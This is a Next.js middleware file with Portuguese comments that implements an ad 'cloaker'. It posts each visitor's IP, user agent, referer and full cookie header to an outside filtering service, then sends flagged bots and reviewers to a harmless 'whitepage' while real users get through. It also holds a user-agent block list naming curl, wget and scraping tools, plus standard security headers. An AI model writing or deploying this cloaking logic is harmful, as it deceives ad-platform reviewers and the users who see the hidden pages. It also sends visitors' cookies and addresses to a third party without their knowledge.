import { NextResponse } from 'next/server'
import type { NextRequest } from 'next/server'
import { isBlockedBotIP } from '@/lib/bot-ips'

// Configuração do cloaker
const CLOAKER_CONFIG = {
  url: 'https://www.altercpa.one/fltr/969-8f076e082dbcb1d080037ec2c216d589-15523',
  enabled: process.env.NEXT_PUBLIC_CLOAKER_TRACKING_ENABLED === 'true'
}

export async function middleware(request: NextRequest) {
  const pathname = request.nextUrl.pathname
  
  // ============================================
  // 🛡️ PROTEÇÃO CONTRA ACESSO POR IP
  // ============================================
  
  const requestHost = request.headers.get('host') || ''
  
  // Domínios permitidos do .env (separados por vírgula)
  const allowedDomainsEnv = process.env.NEXT_PUBLIC_ALLOWED_DOMAINS || ''
  const allowedDomains = [
    ...allowedDomainsEnv.split(',').map(d => d.trim()).filter(Boolean),
    'localhost:3000',
    'localhost:3001',
    'localhost:3002',
    'localhost:3003',
    'localhost:3004'
  ]
  
  // Bloquear se não for um domínio autorizado (acesso por IP) 
  if (allowedDomains.length > 2 && !allowedDomains.some(domain => requestHost.includes(domain))) {
    console.log(`🚫 [Middleware] Bloqueado acesso por IP/domínio não autorizado: ${requestHost}`)
    return new NextResponse('Forbidden', {
      status: 403,
      headers: {
        'Content-Type': 'text/plain',
        'X-Robots-Tag': 'noindex, nofollow'
      }
    })
  }
  
  // ============================================
  // 🎯 CLOAKER - Detecção de Bot vs Usuário Real
  // ============================================
  
  // Apenas na rota raiz (/) e se cloaker estiver ativado
  if (pathname === '/' && CLOAKER_CONFIG.enabled) {
    // Pular cloaker se já tem cookie de verificação (usuário já passou)
    const hasVerifiedCookie = request.cookies.get('cloaker_verified')?.value === 'true'
    
    if (!hasVerifiedCookie) {
      try {
        // Preparar dados do servidor para o cloaker
        const serverData = {
          HTTP_HOST: request.headers.get('host') || '',
          HTTP_USER_AGENT: request.headers.get('user-agent') || '',
          HTTP_ACCEPT: request.headers.get('accept') || '',
          HTTP_ACCEPT_LANGUAGE: request.headers.get('accept-language') || '',
          HTTP_ACCEPT_ENCODING: request.headers.get('accept-encoding') || '',
          HTTP_REFERER: request.headers.get('referer') || '',
          HTTP_X_FORWARDED_FOR: request.headers.get('x-forwarded-for') || '',
          HTTP_CF_CONNECTING_IP: request.headers.get('cf-connecting-ip') || '',
          REMOTE_ADDR: request.ip || request.headers.get('x-real-ip') || request.headers.get('x-forwarded-for') || '',
          REQUEST_URI: request.nextUrl.pathname + request.nextUrl.search,
          REQUEST_METHOD: request.method,
          SERVER_PROTOCOL: 'HTTP/1.1',
          QUERY_STRING: request.nextUrl.search.substring(1),
          HTTP_COOKIE: request.headers.get('cookie') || '',
        }

        // Fazer requisição para o cloaker
        const formBody = new URLSearchParams(serverData as any).toString()
        
        const cloakerResponse = await fetch(CLOAKER_CONFIG.url, {
          method: 'POST',
          headers: {
            'Content-Type': 'application/x-www-form-urlencoded',
            'User-Agent': 'Mozilla/5.0 (Windows NT 6.1; WOW64; rv:135.0) Gecko/20100101 Firefox/135.0',
            'Accept-Encoding': 'gzip, deflate, br'
          },
          body: formBody
        })

        const responseText = await cloakerResponse.text()
        
        if (responseText && responseText.trim()) {
          const result = JSON.parse(responseText)
          
          // Se for "black" (usuário real), setar cookie
          if (result.type === 'black') {
            console.log('👤 [Cloaker] USUÁRIO REAL detectado - setando cookie')
            const response = NextResponse.next()
            response.cookies.set('cloaker_verified', 'true', {
              httpOnly: false, // Permitir leitura no client-side
              secure: true,
              sameSite: 'lax',
              maxAge: 60 * 60 * 24 // 24 horas
            })
            return response
          }
          
          // Se for "white" (bot), deixar passar sem cookie
          console.log('🤖 [Cloaker] BOT detectado - mostrando whitepage')
        }
      } catch (error) {
        console.error('⚠️ [Cloaker] Erro:', error)
        // Em caso de erro, deixar passar (fail-safe)
      }
    }
  }
  
  // ============================================
  // 🛡️ PROTEÇÃO ANTI-SCRAPING
  // ============================================
  
  const userAgent = request.headers.get('user-agent') || ''
  const ip = request.headers.get('x-forwarded-for')?.split(',')[0].trim() || 
             request.headers.get('x-real-ip') || 
             'unknown'
  
  // Lista de user-agents de bots/scrapers conhecidos
  const blockedUserAgents = [
    'python-requests',
    'axios',
    'curl',
    'wget',
    'scrapy',
    'selenium',
    'puppeteer',
    'playwright',
    'headless',
    'bot',
    'crawler',
    'spider',
    'scraper',
    'postman',
    'insomnia',
    'httpie',
    'node-fetch',
    'got',
    'superagent',
    'undici',
    'serper',
    'scrapingbee',
    'brightdata',
    'oxylabs',
    'scraperapi',
    'apify',
    'phantomjs',
    'casperjs',
    'nightmare'
  ]
  
  // Headers suspeitos de serviços de scraping
  const suspiciousHeaders = [
    'x-api-key',
    'x-scraper-key',
    'x-brightdata-key',
    'x-oxylabs-key'
  ]
  
  // Verificar headers suspeitos
  const hasSuspiciousHeaders = suspiciousHeaders.some(header => 
    request.headers.has(header)
  )
  
  // Verificar se é um bot/scraper conhecido
  const isBot = blockedUserAgents.some(bot => 
    userAgent.toLowerCase().includes(bot.toLowerCase())
  )
  
  // Verificar se não tem user-agent (suspeito)
  const hasNoUserAgent = !userAgent || userAgent.trim() === ''
  
  // Bloquear bots/scrapers (exceto em rotas públicas específicas)
  const publicPaths = ['/api/', '/_next/', '/favicon.ico', '/robots.txt', '/sitemap.xml']
  const isPublicPath = publicPaths.some(path => pathname.startsWith(path))
  
  // IMPORTANTE: Se cloaker está ativo na rota /, NÃO bloquear anti-scraping
  // O cloaker vai decidir se é bot ou usuário
  const skipAntiScraping = pathname === '/' && CLOAKER_CONFIG.enabled
  
  if (!isPublicPath && !skipAntiScraping && (isBot || hasNoUserAgent || hasSuspiciousHeaders)) {
    // Retornar página vazia ou erro 403
    return new NextResponse(
      JSON.stringify({ 
        error: 'Access denied',
        message: 'Automated access is not permitted',
        code: 'SCRAPING_BLOCKED'
      }),
      { 
        status: 403,
        headers: { 
          'Content-Type': 'application/json',
          'X-Robots-Tag': 'noindex, nofollow'
        }
      }
    )
  }
  
  // Analytics desabilitado para desenvolvimento
  // Registrar acesso no analytics (não-bloqueante)
  // if (!pathname.startsWith('/_next') && !pathname.startsWith('/api/s7k2m9p4') && pathname !== '/x9f2w8k5') {
  //   try {
  //     const userAgent = request.headers.get('user-agent') || ''
  //     const ip = request.headers.get('x-forwarded-for')?.split(',')[0].trim() || request.headers.get('x-real-ip') || 'unknown'
  //     const referer = request.headers.get('referer') || ''
  //     const query = request.nextUrl.search
  //     
  //     // Fazer requisição assíncrona sem aguardar
  //     fetch(`${request.nextUrl.origin}/api/s7k2m9p4`, {
  //       method: 'POST',
  //       headers: { 'Content-Type': 'application/json' },
  //       body: JSON.stringify({
  //         path: pathname,
  //         userAgent,
  //         ip,
  //         referer,
  //         query,
  //         timestamp: Date.now()
  //       })
  //     }).catch(() => {}) // Ignorar erros silenciosamente
  //   } catch (error) {
  //     // Ignorar erros de analytics
  //   }
  // }
  
  // ============================================
  // 🔒 SISTEMA DE REFERER WHITELIST (Cloaker Interno)
  // ============================================
  
  // Verificar se está rodando em ambiente de desenvolvimento local
  const host = request.headers.get('host') || ''
  const isLocalhost = host.includes('localhost') || host.includes('127.0.0.1')
  
  // Em produção, NUNCA liberar localhost (previne bypass com curl)
  if (isLocalhost && process.env.NODE_ENV === 'development') {
    return NextResponse.next()
  }

  // ============================================
  // 🔓 ACESSO LIVRE - SEM VERIFICAÇÕES
  // ============================================
  
  // Liberar acesso total - sem verificação de cookies, referer ou subdomain
  // Controle de acesso é feito no client-side via cookies
  const response = NextResponse.next()
  
  // ============================================
  // 🔒 CABEÇALHOS DE SEGURANÇA
  // ============================================
  
  // Content Security Policy (CSP) - Proteção contra XSS
  const cspHeader = `
    default-src 'self';
    script-src 'self' 'unsafe-inline' 'unsafe-eval' https://www.googletagmanager.com https://www.google-analytics.com https://cdn.jsdelivr.net https://unpkg.com https://static.cloudflareinsights.com;
    style-src 'self' 'unsafe-inline' https://fonts.googleapis.com;
    img-src 'self' data: https: blob:;
    font-src 'self' data: https://fonts.gstatic.com;
    connect-src 'self' https://www.google-analytics.com https://www.googletagmanager.com https://cloudflareinsights.com https://*.altercpa.one https://*.mercadopago.com https://*.mercadopago.com.br;
    frame-src 'self' https://www.mercadopago.com https://www.mercadopago.com.br;
    object-src 'none';
    base-uri 'self';
    form-action 'self' https://www.mercadopago.com https://www.mercadopago.com.br;
    frame-ancestors 'none';
    upgrade-insecure-requests;
  `.replace(/\s{2,}/g, ' ').trim()
  
  response.headers.set('Content-Security-Policy', cspHeader)
  
  // HSTS - HTTP Strict Transport Security (força HTTPS)
  response.headers.set(
    'Strict-Transport-Security',
    'max-age=31536000; includeSubDomains; preload'
  )
  
  // COOP - Cross-Origin-Opener-Policy (isolamento de janela)
  response.headers.set('Cross-Origin-Opener-Policy', 'same-origin')
  
  // X-Frame-Options - Proteção contra clickjacking
  response.headers.set('X-Frame-Options', 'DENY')
  
  // X-Content-Type-Options - Previne MIME sniffing
  response.headers.set('X-Content-Type-Options', 'nosniff')
  
  // Referrer-Policy - Controla informações de referer
  response.headers.set('Referrer-Policy', 'strict-origin-when-cross-origin')
  
  // Permissions-Policy - Controla features do browser
  response.headers.set(
    'Permissions-Policy',
    'camera=(), microphone=(), geolocation=(), interest-cohort=()'
  )
  
  return response
}



// Configurar em quais rotas o middleware deve rodar
export const config = {
  matcher: [
    '/((?!_next/static|_next/image|favicon.ico).*)',
  ],
}
